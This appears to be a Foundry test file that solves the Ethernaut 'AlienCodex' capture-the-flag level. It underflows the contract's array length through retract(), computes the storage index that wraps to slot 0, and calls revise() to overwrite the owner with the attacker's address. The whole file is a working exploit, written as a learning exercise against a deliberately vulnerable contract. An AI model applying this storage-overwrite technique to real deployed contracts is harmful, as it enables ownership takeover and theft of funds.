pragma solidity ^0.8.10;

// import "ds-test/test.sol";
import "../src/Ethernaut.sol";
import "forge-std/Vm.sol";
import "forge-std/Test.sol";


contract AlienCodexTest is Test {
    Ethernaut ethernaut;
    address eoaAddress = vm.addr(1);

    function setUp() public {
        // Setup instance of the Ethernaut contract
        ethernaut = new Ethernaut();
        vm.deal(eoaAddress, 10 ether);
    }

    function testAlienCodexHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////
        bytes memory bytecode = abi.encodePacked(vm.getCode("./src/19-AlienCodex/AlienCodex.json"));
        address level;
        assembly {
            level := create(0, add(bytecode, 0x20), mload(bytecode))
        }

        vm.startPrank(eoaAddress, eoaAddress);


        //////////////////
        // LEVEL ATTACK //
        //////////////////

        bool success = false;

        (success, ) = level.call(abi.encodeWithSignature("make_contact()"));
        console.log("make contact", success);

        (success, ) = level.call(abi.encodeWithSignature("retract()"));
        console.log("claim storage access", success);

        uint256 index = type(uint256).max - uint256(keccak256(abi.encode(1))) + 1;
        console.log("targeted index", index);

        (success, ) = level.call(abi.encodeWithSignature("revise(uint256,bytes32)", index, bytes32(uint256(uint160(eoaAddress)))));
        console.log("overwrite owner", success);


        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////

        (, bytes memory data) = level.call(abi.encodeWithSignature("owner()"));

        // data is of type bytes32 so the address is padded, byte manipulation to get address
        address refinedData = address(uint160(bytes20(uint160(uint256(bytes32(data)) << 0))));

        vm.stopPrank();
        assertEq(refinedData, eoaAddress);
    }
}